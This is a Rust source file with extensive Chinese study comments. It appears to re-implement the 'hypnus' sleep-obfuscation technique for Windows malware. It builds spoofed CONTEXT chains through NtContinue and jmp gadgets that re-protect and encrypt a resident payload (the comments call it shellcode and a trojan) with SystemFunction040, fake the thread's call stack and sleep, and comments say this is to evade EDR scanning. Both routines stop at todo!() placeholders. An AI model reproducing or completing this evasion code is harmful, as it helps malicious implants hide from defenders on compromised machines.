#![allow(unused)]

//use alloc::string::String;//原项目hypnus中用于obfstr的宏展开,samoa中未使用obfstr,而是使用了error.rs中的HypnusError和steal_bail!来error handling

use puerto::winapis::NT_SUCCESS;
use spin::mutex;
// uwd库中lib.rs使用了pub use uwd::*;=uwd::uwd::AsPointer
use uwd::AsPointer;

use crate::error::HypnusError::{
    InvalidArguments, NtCreateEventFailed, NtDuplicateObjectFailed, NtWaitForSingleObjectFailed,
    TpAllocPoolFailed, TpAllocTimerNtSetEventFailed, TpAllocTimerRtlCaptureContextFailed,
    TpSetPoolStackInformationFailed,
};
use crate::types::{
    CONTEXT_FULL, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
    TP_CALLBACK_ENVIRON_V3, TP_POOL_STACK_INFORMATION,
};
use crate::winapis::{
    NtCreateEvent, NtDuplicateObject, NtSetEvent2, NtWaitForSingleObject, TpAllocPool, TpAllocTimer, TpAllocWait, TpSetPoolMaxThreads, TpSetPoolMinThreads, TpSetPoolStackInformation, TpSetTimer, TpSetWait,
};
use crate::{debug_log, stealth_bail};
use core::ptr::null;
use core::task::Context;
use core::{ffi::c_void, mem::zeroed, ptr::null_mut, time};

use crate::config::{Config, current_rsp, init_config};
use crate::error::{HypnusError, Result};
use crate::gadget::GadgetContext; // gadgetcontext是一个trait,其内部是fn jmp(),因为jmp没有pub,只能通过引入gadgetcontext的方式引入jmp() // 代替源码hyonus中anyhow的Result

use puerto::types::{CONTEXT, DUPLICATE_SAME_ACCESS, EVENT_ALL_ACCESS, EVENT_TYPE, LARGE_INTEGER};
use puerto::winapis::{NtCurrentProcess, NtCurrentThread};
/// Enumeration of supported memory obfuscation strategies
///
/// 用于指定休眠混淆的底层调度方式(线程池/APC),并用于fiber入口处路由执行框架;无论Timer还是Foliage,核心主载荷的加密方式都是写死的(ROP链中的SystemFunction040)
pub enum Obfuscation {
    /// The technique using windows thread poll(TpSetTimer)
    /// 单元变体（Unit Variant):该类型不携带数据,写出全名就是初始化
    Timer,
    /// The technique using windows thread poll(TpSetWait)
    Wait,
    /// The technique using Apc(NtQueueApcThread)
    Foliage,
}

// derive相关 详见rust grammer
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
// 代表透明内存布局(编译时,把该类型当作其内部的类型对待):强制ObfMode结构体内部布局和定义时的内部字段完全一致(物理内存中的大小(等于u32的4字节大小)/对齐(等于u32的4字节对齐)/abi(如一个函数接收这个类型的参数时,与接收一个u32没有区别.如果没有这个属性,编译器可能把这个结构体通过栈/指针来隐式传递) 与u32一致,不能有多余padding),避免rustc的优化(默认是#[repr(transparent)]).使ObfMode中u32的值和物理属性与u32完全一致.
#[repr(transparent)]
/// 元组结构体(包含一个匿名字段/成员);
/// 是Rust中的NewType模式:即用结构体包装一个已有类型以提供类型安全;
/// 该结构体用于表示:混淆中是否开启额外的内存操作特权(是私有堆独立加密/主载荷的rwx权限妥协).该结构体ObfMode不改变使用的加密方式(SystemFunction040),只更改内存权限
pub struct ObfMode(pub u32);

/// 后续会手动传入timer!/wait!/Hypnus结构体.在执行时,会通过这个值决定如何操作内存加密
impl ObfMode {
    // Rust中,在impl中为结构体定义附属于该类型的常量,称为关联常量(非常Idiomatic Rust的设计模式):以ObfMode::Heap的形式使用,且其命名空间被锁定在ObfMode::空间中,不会与rust prelude的Option::None发生冲突.如果不在impl块中定义pub const None: ObfMode = ObfMode(0b0000);则会污染当前模块的命名空间.
    // 这么写的好处:1. 模拟enum类型,同时保持 #[repr(transparent)]的底层物理特性.如果使用enum会有tag标识. 2. 高内聚性encapsulation:符合面向对象驱动的设计思想,None\Heap\Rwx是ObfMode类型的合法预设值,将它们和ObfMode绑在一起,提升代码可读性
    // 这三个常量的生命周期:在Rust中,只要是const关键字定义的常量,无论在什么地方,其生命周期和内存行为都是一致的. 1. const在编译时会被直接内联到所有调用它的地方;在运行时ObfMode::None没有一般变量的堆栈生命周期,不占用运行时的变量生存期,不会在程序运行期间被释放/销毁 2. 若取其引用,自动提到'static,rustc将该常量的值放入程序只读数据段.rdata
    // 这里的None是一个全局公开常量,其内部的值是ObfMode(0b0000);借助#[repr(transparent)],其本质是一个u32,但在Rust类型系统角度,它是一个新的ObfMode类型.
    // None不是rust关键字(是core::option::Option::None).且控制在impl ObfMode命名空间中,不会和预导入的None冲突
    pub const None: Self = ObfMode(0b0000);

    // ObfMode结构体内部只有一个u32,后面的Heap/Rwx都是ObfMode这个结构体的不同值(封装了不同的u32)
    pub const Heap: Self = ObfMode(0b0001);

    pub const Rwx: Self = ObfMode(0b0010);

    /// Checks whether the flag contains another `ObfMode`.
    ///
    /// 该函数参数传入self,但上面对ObfMode derive了copy.self从移动所有权变成了按位复制.不改变原所有权,把复制的数据给了函数
    fn contains(self, other: ObfMode) -> bool {
        (self.0 & other.0) == other.0
    }
}

/// 重载|操作符(针对ObfMode)
impl core::ops::BitOr for ObfMode {
    type Output = Self;

    fn bitor(self, rhs: Self) -> Self::Output {
        ObfMode(self.0 | rhs.0)
    }
}

/// Structure responsible for centralizing memory obfuscation techniques
///
/// 该机构体封装目标载荷的内存(base,size表示),休眠时钟(timer),底层api地址(cfg),混淆时的内存权限(ObfMode).
///
/// 项目于中所有具体执行流(timer/wait/foliage)都是在该结构体上实现的
#[derive(Clone, Copy, Debug)]
struct Hypnus {
    /// base memory pointer to be manipulated or operated on
    base: u64,

    size: u64,

    /// delay time in seconds
    time: u64,

    /// resolved winapi required for execution
    // cfg:&'static Config,
    cfg: &'static Config,

    /// Obfuscantion modes
    mode: ObfMode,
}

impl Hypnus {
    /// create a new Hypnus structure
    #[inline]
    fn new(base: u64, size: u64, time: u64, mode: ObfMode) -> Result<Self> {
        if base == 0 || size == 0 || time == 0 {
            stealth_bail!(InvalidArguments, "invalid arguments")
        }

        Ok(Self {
            base,
            size,
            time,
            // 在宏调用时赋予了实参.这是省略写法=mode:mode, rust中,实例化一个结构体时,如果当前作用域内存在一个与结构体字段同名的变量.可以省略:value的赋值部分
            mode,
            cfg: init_config()?,
        })
    }

    /// performs memory obfuscation using a thread-pool timer sequence,线程池和事件组合
    fn timer(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use:heap是ObfMode字段的值.这里代表使用堆加密的混淆方式
            let heap = self.mode.contains(ObfMode::Heap);

            // 内存权限:载荷解密后使用rx还是rwx
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // 后续用到的三个event的载体
            let mut events = [null_mut(); 3];

            // 曾将&mut events写成event.区别:由于数组evevts是*mut c_void(实现了Copy trait),通过copy将events的每个元素传入循环体(即events元素的类型从&mut *mut c_void 退化为*mut c_void)在循环内部创建的事件句柄不会写入原events数组.循环结束原events数组中元素仍为null_mut()
            for event in &mut events {
                // ffi的extern "system"方式调用win native api
                let status = NtCreateEvent(
                    // 输出:成功的事件对象handle
                    event,
                    EVENT_ALL_ACCESS,
                    null_mut(), // 传空代表该事件是anonymous的.EDR对有名事件在扫描全局对象目录时很容易发现.anonymous对象只存于当前进程句柄表,隐匿性最高
                    EVENT_TYPE::NotificationEvent, //设置为有信号的通知型事件:会一直保持有信号状态,直到被重置(在hypnus的异步链中,一个事件可能被多个context同时等待,通知型事件能确保所有监听者都能收到信号)
                    0, // 初始为无信号状态,意味着所有等待该事件的线程都会立即挂起,直到后续有指令发其他信号);
                );

                if !NT_SUCCESS(status) {
                    stealth_bail!(NtCreateEventFailed, "NtCreateEvent Failed"); // 宏后面到底需要加 ; 吗
                }
            }

            // 开始配置并初始化一个 threadpool
            // Allocate dedicated threadpool with one worker

            // 用来表示指向TP_POOL的句柄:代表整个线程池的根,后续所有线程数量/大小都同各国这个poll指针进行挂载
            let mut pool: *mut c_void = null_mut();

            // 用TpAllocPool在用户态堆区分配并初始化一个TP_POOL结构体,并在内核中创建一个Worker Factory对象.但此时并没有产生真正的线程
            let mut status = TpAllocPool(
                &mut pool, // 对应的参数类型是指针的指针,所以尽管pool本身是copy的,这里也需要用&
                null_mut(),
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(TpAllocPoolFailed, "TpAllocPool Failed")
            }

            // Configure threadpool stack size
            // 0x80000=512kb,这个4kb是怎么计算得到的,见注释1
            let mut stack = TP_POOL_STACK_INFORMATION {
                StackCommit: 0x80000,
                StackReserve: 0x80000,
            };

            // 创建线程池
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    TpSetPoolStackInformationFailed,
                    "TpSetPoolStackInformation Failed"
                )
            }

            // 设置该线程池中线程串行执行,消除竞争
            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            /// prepare callback environment,将后续所有异步任务强行绑定到自定义的私有单线程池上.详见hypnus.md
            let mut env = TP_CALLBACK_ENVIRON_V3 {
                Pool: pool,
                ..Default::default()
            };
            // 线程池配置完成

            // capture the current thread context

            let mut timer_ctx: *mut c_void = null_mut();

            /// 代表当前所有寄存器状态快照:除了rcx置为RtlCaptureContext的地址
            /// 在主线程开辟1.2kb空间(sizeof(CONTEXT)).后续将代表寄存器状态快照(CONTEXT),[rcx](rcx是寄存器地址)置为RtlCaptureContext的地址.
            /// 后续trampoline执行jmp [rcx]时,cpu就跳入ntdll!RtlCaptureContext开始执行
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // 分配第一个定时器对象timer_ctx:与win api RtlCaptureCpntext绑定,由于这个api是微软编译好的系统只读api,且存在rdx 和 rcx的寄存器错位,所以需要trampoline调整(注意和第二个定时器的区别)
            // 本项目作用:见下一个函数TpSetTimer
            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.
            // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
            // ensuring a clean transition with no extra instructions before context capture.
            status = TpAllocTimer(
                // 输出:代表该函数成功执行后,内核新创建的定时器对象TP_TIMER的虚拟内存地址指针(用户态程序拿到的永远是VA)
                &mut timer_ctx,
                // 回调(定时器触发后执行的回调函数入口地址):指向trampoline:Config中的trampoline(mov rcx,rdx .. jmp [rcx]).而P1Home(对应执行时寄存器解引用的[rcx])已经在ctx_init中设为RtlCaptureContext的地址.为何要使用trampoline 见hypnus.md
                self.cfg.trampoline as *mut c_void,
                // 回调函数执行时的寄存器状态(CONTEXT). 语法方面详见注释2
                &raw mut *&mut ctx_init as *mut _ as *mut c_void,
                // 回调函数执行时,使用的线程池环境
                &mut env,
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    TpAllocTimerRtlCaptureContextFailed,
                    "TpAllocTimer [RtlCaptureContext] Failed"
                )
            }

            // LARGE_INTEGER win特有的64位的union:用于表示超大整数.是win处理系统时间/性能/计数的唯一标准
            // core::mem::zeroed,将该64位内存全部刷为0(但不包括结构体中个字段中间的padding),防止被之前脏数据干扰.
            let mut delay = zeroed::<LARGE_INTEGER>();

            // win内核的时间精度是100纳秒(1ms毫秒=1000us微秒;1us=10*100纳秒).1ms=10000个100纳秒单位.即100i64 * 10_000表示100ms
            // win下,正数代表绝对时间,从1601年1月1日起算的总刻度;负数代表相对时间,从现在起算.
            // 这里代表100ms后执行
            delay.QuadPart = -(100i64 * 10_000);

            // 激活第一个定时器对象timer_ctx,将TpAllocTimer分配的这个定时器对象激活,开始倒计时
            // 本项目作用:主线程100ms后触发定时器,主线程调用NtWaitForSingleObject挂起自身.定时器触发后,内核唤醒私有线程池中唯一的worker执行trampoline,在trampoline中引导cpu执行ntdll!RtlCaptureContext将该worker此刻寄存器状态写入ctx_init.后续以此为基础设置10个ctx
            TpSetTimer(
                // 输出参数,由tpalloctimer产生,在调用TpSetTimer前,已经被TpAllocTimer填入
                timer_ctx,  // 唤醒时刻
                &mut delay, // 周期msperiod,0代表是one-shot单次触发任务;
                0,
                // msWindowLength - 时间窗口:允许系统延迟执行的宽限期.0代表只要倒计时一归零，必须立刻发送唤醒信号(实际执行中受硬件时钟终端频率限制(一般15.6ms),除非使用timeBeginPeriod修改系统时钟频率)
                0,
            );
            // 第一个定时器timer_ctx配置完成

            // 设置第二个定时器:第一个定时器执行RtlCaptureContext捕获快照后,直接返回,主线程继续休眠.第二个定时器设为200ms,去点亮events[0]
            let mut timer_event = null_mut();

            // 第二个定时器绑定的是事件events[0]:用于通知主线程快照已经抓完,可以继续向下执行.
            //
            status = TpAllocTimer(
                // 输出:第二个定时器handle
                &mut timer_event,
                // win api:将事件对象从无信号转为有信号 详见注释3
                NtSetEvent2 as *mut c_void,
                //  函数开头创建的第一个事件handle
                // 1. events[0]->TpAllocTimer(事件与定时器绑定);2. 定时器触发-> events[0] 被塞进 CPU 的 RDX 寄存器(根据回调函数的约定,这里的第三个参数作为回调函数的第二个参数);3. NtSetEvent2 被调用 -> 它用 RDX中的handle,去内核发起系统调用
                events[0],
                &mut env,
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(
                    TpAllocTimerNtSetEventFailed,
                    "TpAllocTimer [NtSetEvent] Failed"
                )
            }

            // 将主线程(当前线程)陷入休眠(将events[0]绑定到NtWaitForSingleObject),直到指定的events[0]信号出现,才继续执行主线程
            // Wait for context capture to complete
            status = NtWaitForSingleObject(
                // 等待的事件对象句柄
                events[0],
                // 是否可被其他中断唤醒
                0,
                // 等待时长(这里代表事件信号出现就立即执行)
                null_mut(),
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(NtWaitForSingleObjectFailed, "NtWaitForSingleObject Failed")
            }

            // 主线程陷入休眠,开始构建十个ctx
            // Build multi-step spoofed CONTEXT chain
            // 每个ctx_init都是cpu的瞬时寄存器数据,用于加载到NtContinue,通过Ntcontinue构建config,然后修改config执行指定的函数.
            // 根据上面获取的快照ctx_init,伪造10份.CONTEXT derive copy,这里在内存(栈)执行了10此memcpy.即创建了10个一样的执行环境,每个都有该线程池的线程的原始寄存器状态
            let mut ctxs = [ctx_init; 10];
            // 将10个ctx的rax置为NtContinue的地址,然后将栈向低地址扩张8个字节,用来在rsp指向的空间中保存伪造的返回地址(ROP链中下一跳的地址).防止原栈顶数据被覆盖
            // 因为ASLR的存在,ntcontinue的va是动态随机的.因此不能在编译阶段将其地址硬编码在静态的机器码中.所以要动态解析其地址并存入ctx.rax中,之后通过trampoline(cfg.callback)读取并跳转
            for ctx in &mut ctxs {
                // NtContinue接收一个context,强迫cpu变成context描述的状态
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

            // Duplicate thread handle for context manipulation
            // NtCurrentThread() （伪句柄  -2)代表当前工作线程.t_thread通过NtDuplicateObject获取主线程的绝对真实句柄.锁定这个绝对句柄一定也只能指向主线程
            let mut h_thread = null_mut();

            // NtDuplicateObject,内核提供的handle克隆api.在内核句柄表(handle table)中,创建新索引条目,该条目指向一个存在的内核对象.可以跨进程克隆句柄,可以在同一进程中将受限/临时的句柄转为永久/有完全访问权限的实体句柄
            // 其核心功能是将源进程表中的一个对象句柄索引，在目标进程（或同进程）的句柄表中创建一个新的有效条目，并根据权限掩码（ACCESS_MASK）赋予其相应的访问能力
            // 在该项目中，此函数的作用是将当前线程的“伪句柄（Pseudo-handle）”转换为具备完整访问权限的“真实内核对象句柄”，以解决多线程异步环境下的定位冲突.这里将伪句柄(-2)传给ctx.rcx传给,
            status = NtDuplicateObject(
                // 源进程
                NtCurrentProcess(),
                // 源对象
                NtCurrentThread(),
                // 目标进程
                NtCurrentProcess(),
                // 目标对象
                &mut h_thread,
                // 期望权限
                0,
                // 句柄属性
                0,
                // 复刻源的所有权利
                DUPLICATE_SAME_ACCESS,
            );
            if !NT_SUCCESS(status) {
                stealth_bail!(NtDuplicateObjectFailed, "NtDuplicateObject Failed")
            }

            // 调用config.rs中的spoof_context(),构建伪造的回溯链
            // Base CONTEXT for spoofing
            ctx_init.Rsp = current_rsp();
            // spoof_context不是针对某个函数/payload的伪造栈,而是伪造了整个回溯链.这里ctx_init提供当前栈的所有寄存器状态
            // EDR回溯的起点是rsp指向的栈槽位,即使rip里是payload地址,也不影响伪造栈.即,这里从payload之后开始一直伪装到回溯的根部
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // 开始构造10个ctx(类型是CONTEXT):在jmp()中,找到合适的jmp <reg>,然后将gadget(jmp <reg>)赋给ctx.rip,将敏感函数地址存入gadget的通用寄存器中.之后用每个ctx的rcx/rdx/r8/r9用来传递被调用的敏感api需要的参数.效果是在ntcontinue执行这个gadget时通过jmp <reg>执行了敏感函数
            // The chain will wait until `event` is signaled
            //
            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
            // 该函数有3个参数
            // 将events[1]和NtWaitForSingleObject绑定:只有events[1]发信号这个绑定的函数才会执行
            ctxs[0].Rcx = events[1] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8 = 0;

            // Temporary RW access:将原本rx的内存属性转为rw,用于写入
            // 设置ctxs[1]:ROP链中改变shellcode内存属性的环节
            let mut old_protect = 0u32;
            // base和size本身就是指针(u64),这里遮蔽为可变指针
            // NtProtectVirtualMemory要求传入指针的指针,且可能因为内存对齐对内存进行修改.
            // 因此这里拷贝一份木马的内存,用于后面操作木马的内存?
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            // 注意下面的base和size通过as_u64()将各自
            // base.as_u64是否从下从mut self 到&mut self的转换?从而通过该函数得到指向base(u64类型,其本身就是一个指针)的指针?
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8 = size.as_u64();
            // shellcode通常是rx,但下一步需要XOR加密,需要暂时改为rw
            ctxs[1].R9 = PAGE_READWRITE as u64;
            // NtprotectVirtualMempry有5个参数,这里只配置了4个,第五个参数后面通过((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64())在栈上写入第五个参数的代码.为啥这里不直接写完第五个参数呢?

            // ctxs[2]:Encrypt region:利用系统自带加密函数SystemFunction040对shellcode加密
            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size; // 该 native api要求此值必须是8字节对齐,这里是否需要进行检查?
            // 对应RTL_ENCRYPT_OPTION_SAME_PROCESS:加密后的数据仅能在当前进程内解密
            ctxs[2].R8 = 0;


            //ctxs[3]:backup context备份当前线程状态
            // 作用:
            let mut ctx_backup
             = CONTEXT{ContextFlags:CONTEXT_FULL,
            ..Default::default()};
         // jmp函数将ctxs[3].rip指向一个系统合法(三个dll中)的gadget(jmp <reg>),根据找到的reg将target函数NtThreadContext的地址放进去.该函数读取指定线程的cpu寄存器快照;必须使用NtThreadContext,这时唯一能获取包括rsp/eflags(状态位)在内,能够完整描述一个线程状态的官方接口
         (&mut ctxs[3]).jmp(self.cfg,self.cfg.nt_get_context_thread.into());
         ctxs[3].Rcx=h_thread as u64;
         ctxs[3].Rdx=ctx_backup.as_u64();


         // ctxs[4]:Inject spoofed context:
         // NtSetContextThread是SetThreadContext的底层系统调用:允许一个进程强制重写指定线程的cpu寄存器状态.内核强行修改cpu硬件层面的寄存器值,使得线程在下一次cpu时钟周期恢复执行时,直接变为提供的新状态
         ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
         ctxs[4].Rcx=h_thread as u64;
         ctxs[4].Rdx=ctx_spoof.as_u64();

         // sleep:将当前线程陷入休眠
         // shellcode的内存已加密(ctxs[2]),当前线程的栈帧已伪造(ctxs[4]),线程处于合法等待状态
         // 此后当前线程带着伪造的栈帧运行.下面调用WaitForSingleObject,当前的stack Unwind是ctxs[4]伪造好的 
        ctxs[5].jmp(self.cfg,self.cfg.wait_for_single.into());
        // WaitForSingleObject的第一个参数是陷入休眠的线程handle,这里置为当前线程.让线程等待自己结束,这样方式来陷入休眠(通常线程只有在terminate结束时才变为有信号状态,让线程等待一个在休眠期间永远不会发生的信号,这样强制利用超时机制达到sleep.WaitForSingleObject是系统常见行为,而sleep是edr检测重点).
        ctxs[5].Rcx=h_thread as u64;
        // 休眠时间(ms)
        ctxs[5].Rdx=self.time * 1000;
        // 对R8清零
        ctxs[5].R8=0;


        // ctxs[6]





            todo!()
        }
    }



/// performs memory obfuscation using a thread-pool wait-based strategy
/// 
/// this strategy is similar to hyonus::timer ,but uses TpSetWait instead of TpSetTimer to drive the spoofed CONTEXT chain
    fn wait(&mut self)->Result<()> {
        unsafe {
            // determine if heap obfuscation and RWX memory should be use
            let heap =self.mode.contains(ObfMode::Heap) ;
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // events used to synchronize context capture and chain completion

            // 数组events是一个值,是当前函数栈上直接分配的,大小固定的值;是栈上一个连续的,大小32字节(4*8)的内存块,里面初始化了4个0,即空指针null_mut()
            let mut events = [null_mut();4];
            for event in &mut events {
                let status = NtCreateEvent(event, EVENT_ALL_ACCESS, null_mut(),EVENT_TYPE::NotificationEvent , 0);

                 if !NT_SUCCESS(status) {
                stealth_bail!(HypnusError::NtCreateEventFailed,"NtCreateEventFailed")
            }
            }
// allocation dedicated threadpool with one worker
           let mut pool = null_mut();
           let mut status = TpAllocPool(&mut pool, null_mut());
           if !NT_SUCCESS(status) {
               stealth_bail!(HypnusError::TpAllocPoolFailed,"TpAllocPool Failed")
           }

           // configure threadpool stack sizes
           let mut stack = TP_POOL_STACK_INFORMATION{StackCommit:0x80000,StackReserve:0x80000};
           // TpSetPoolStackInformation原型的第二个参数是*mut,但这里却传入了&mut.详见注释4
           status =TpSetPoolStackInformation(pool, &mut stack);

           // 配置线程池为单线程
           TpSetPoolMinThreads(pool, 1);
           TpSetPoolMaxThreads(pool, 1);

           // prepare callback environment
           // TP_CALLBACK_ENVIRON_V3代表?
           let mut env =TP_CALLBACK_ENVIRON_V3{Pool:pool,..Default::default()} ;

           // capture the current thread context
           let mut wait_ctx = null_mut();
           // 关于CONTEXT的初始化详情,见注释5
           let mut ctx_init = CONTEXT{
            ContextFlags:CONTEXT_FULL,
            P1Home:self.cfg.rtl_capture_context.as_u64(),
            ..Default::default()
           };

           // the trampoline is needed beacuse thread pool passes the parameter in rdx,not rcx
           // the trampoline moves rdx to rcx and jumps to CONTEXT.P1Home(RtlCaptureContext)
           // ensuring a clean transition with no extra instructions before context capture

           // 在私有线程池创建一个监听器(wait objec),一旦后续点亮某事件.线程池中的worker thread被唤醒去执行trampoline,并将准备好的ctx_init结构体的内存地址传给它.trampoline会让worker thread调用 RtlCaptureContext.把工作线程干净,没有用户函数污染的寄存器快照写入ctx_init中
           status=TpAllocWait(
            // 输出参数,其类型是双指针.后续win内核在堆区申请好TP_WAIT结构体后,将该结构体的内存首地址写入wait_ctx变量中.之后会通过TpSetWait正式开启监听
            &mut wait_ctx, 
            // 输入参数,回调函数地址.其类型是函数指针,需要符合PTP_WAIT_CALLBACK 签名.这里将trampoline通过as *mut c_void强转成无类型的通用裸指针,满足ffi签名
            self.cfg.trampoline as *mut c_void, 
            // 传入回调函数的参数.&mut ctx_init是rust安全引用(类型 &mut CONTEXT) -> as *mut _(将rust安全引用转为裸指针,类型*mut CONTEXT,使用_让编译器自动推导) -> as *mut c_void(将*mut CONTEXT 转为*mut c_void 满足api原型参数的要求)
            &mut ctx_init as *mut _ as *mut c_void, 
            // 输入参数,类型*mut TP_CALLBACK_ENVIRON_V3:配置之前私有单线程池的初始化.事件被点亮后由私有工作线程去执行跳板.如果传入null_mut(),该任务会被丢进系统公共线程池.
            &mut env);

            if !NT_SUCCESS(status) {
                stealth_bail!(HypnusError::TpAllocWaitRtlCaptureContextFailed,"TpAllocWait [RtlCaptureContext] Failed")
            }

            let mut delay = zeroed::<LARGE_INTEGER>();
            delay.QuadPart=-(100i64 * 10_000);
            // 设置两个触发机关(事件被点亮/超时)
            TpSetWait(
                // 要激活的等待对象句柄
                wait_ctx,
                // 要监听的内核对象句柄(或事件)
                events[0], 
                // 超时时间指针
                &mut delay);


                // signal after RtlCaptureContext finish
                let mut wait_event = null_mut();
                status=TpAllocWait(&mut wait_event, NtSetEvent2 as *mut c_void, events[1], &mut env);

                if !NT_SUCCESS(status) {
                    stealth_bail!(HypnusError::TpAllocTimerNtSetEventFailed,"TpAllocWait [NtSetEvent] Failed")
                }

                delay.QuadPart=-(200i64 * 10_000);
                // 让wait_event同样去监听events[0](或200ms的超时,晚于wait_ctx的100ms).由于线程池单线串行执行,确保工作线程先执行trampoline抓完快照,后执行NtSetEvent2去点亮events[1],从而安全唤醒主线程.
                TpSetWait(wait_event, events[0], &mut delay);

                // Wait for context capture to complete:主线程在这里无限挂起自己,直到events[1]被worker thread在执行ntsetevent2时点亮.这意味着快照抓取完成,主线程可以安全唤醒
            status = NtWaitForSingleObject(events[1], 0, null_mut());
            // 以上执行流:events[0]是一个占位事件,在内核中永远处于无信号状态,其唯一目的是充当TpSetWait参数,让线程池通过100ms/200ms的超时触发回调;events[1]是真正的唤醒信号,200ms超时后,被工作线程执行NtSetEvnet2主动点亮,用以唤醒正在等待的主线程
            // 1. 主线程在修单线程池中注册两个等待任务(wait_ctx wait_event):wait_ctx等待events[0]或100ms超时,触发后执行trampoline(抓取快照并存入ctx_init);wait_event也等待events[0]或200ms超时,触发后执行NtSetEvent2(负责点亮events[1])
            // 2. 主线程调用NtWaitForSingleObject挂起自己,进入无限沉睡,等待wait_event的完成信号
            // 3. worker thread执行wait_ctx抓取快照:100ms超时后,工作线程被唤醒执行wait_ctx(通过trampoline进入RtlCaptureContext,将当前干净的寄存器状态写入主线程ctx_init内存中)
            // 4. 200ms超时后,工作线程接着执行wait_event:通过NtSetEvent2向events[1]发送激活信号
            // 5. events[1]亮起,内核唤醒主线程.主线程确信ctx_init已被工作线程完整写好.进而执行之后的栈伪造




        }


        todo!()
    }
}

/// converts self to a u64 that representing the pointer value
///
trait Asu64 {
    fn as_u64(&mut self) -> u64;
}

impl<T> Asu64 for T {
    fn as_u64(&mut self) -> u64 {
        // self as *mut _ :从self(&mut T)转为raw pointer
        // as *mut c_void:转为符合c 的接口标准(ffi)
        self as *mut _ as *mut c_void as u64
    }
}

// 注释1
// win默认在线程启动只提交4kb.当线程的局部变量需要更多栈空间时,必须顺序访问下一个页面,触发PAGE_GUARD保护页异常,os内核捕获后会自动提交新页面.但是只有最后一个committed的页是Guard Page(其属性是PAGE_GUARD | PAGE_READWRITE),该页处于committed 和 reserved之间.
// 在向属性PAGE_GUARD的页写入数据时,才会触发Page Fault缺页异常,进而陷入内核(缺页异常处理程序)由内核去除该页的PAGE_GUARD属性,将其变为普通committed的可读写页,将下一个相邻的页属性变为PAGE_GUARD.结果是:栈安全的向下扩展一页,程序无感知的继续运行.
// 但在spoof.rs的spoof函数, ctx.Rsp = (ctx.Rsp - 0x1000 * 10) - (伪造栈帧大小);减去了40+kb的空间.以保守的40kb计算,这里rsp直接指向了非常远的位置,自然跳过了属性为PAGE_GUARD的页.那么当cpu尝试向该页写入数据,cpu硬件触发Page Fault(缺页异常),进而陷入内核,但是对应的内存虚拟地址没有PAGE_GUARD属性.内核判定这不是合法的栈增长请求,而是一个非法的野指针尝试写入未分配的内存.内核进而向该线程派发 STATUS_ACCESS_VIOLATION （ 0xC0000005,即段错误/内存越界访问）异常.而代码又没有捕获该异常,进程瞬间崩溃.
// 扩展:正常程序如果声明一个巨大的局部变量(如 char buffer[102400]; 即100k的栈缓冲区),那么也会出现撞向未提交页面和绕过保护页的情况.但正常程序没有崩溃,在于编译器(如MSVC GCC Clang Rustc)后台使用一种栈探测Stack Probing的机制,即 _ _chkstk 栈探测函数
// 编译器发现某个函数内部申请的栈空间超过一个页面4kb的大小时.编译器不会直接生成sub rsp,102400这样的指令,而是在函数入口强行插入对系统底层函数_ _chkstk的调用的指令.
// 该函数由微软运行时库提供,它在内部执行一个循环,以4kb为步长,借用临时寄存器(win64下是rcx)复制当前rsp,然后逐步sub rcx,4096,再用test [rcx],eax去触碰该页面,强制触发PAGE_GUARD异常,让内核提交内存.这样确保每一个PAGE_GUARD保护页都按顺序被触发,最后一次性执行sub rsp,rax,把rsp挪到最终位置.这样,内核一页一页的提交内存,直到申请的栈大小全部被提交后. __chkstk  才会正式将  RSP  指针修改为最终的目标地址，并返回

// 注释2
//  &mut ctx_init: 栈上获取本地变量ctx_init的唯一可变引用,其类型是&mut CONTEXT
// as *mut _:跨越安全边界并自动推导类型,将安全的可变引用&mut 强制转为*mut(裸指针).这里的 _ 是类型占位符,作用是让Rustc根据上下文自动推导目标类型,可以提高代码的移植性避免冗长的类型声明.因为,CONTEXT可能来自不同的第三方库(puerto/dinvk)

// 注释3
// 如何从外部链接到本项目的:在winapis.rs中有对NtSetEvent2的定义(作为一个封装的中转函数)
// 其内部调用NtSetEvent win api需要2个参数,
// 但是根据TpAllocTimer的约定,其代表回调函数的参数要符合PTP_TIMER_CALLBACK(等待定时器回调函数原型),该原型接收3个参数.
// 但是后续的wait模式(使用TpAllocWait注册,其回调的参数要符合PTP_WAIT_CALLBACK(等待事件回调函数原型),接收4个参数).为了方便后续复用,将ntsetevent2直接设计为4个参数
// 在混淆逻辑运行时,调用NtSetEvent2的是win线程池的工作线程(worker thread).当线程池触发定时器跳到NtSetEvent2时,工作线程内部会执行给寄存器赋值操作
// 第一个定时器使用trampolie 第二个定时器使用wrapper函数:核心原因是 RtlCaptureContext本身就是捕获当前寄存器状态的,如果使用wrapper RtlCaptureContext的方式,明显会由于proluge 和 尾声 破坏当前寄存器状态.
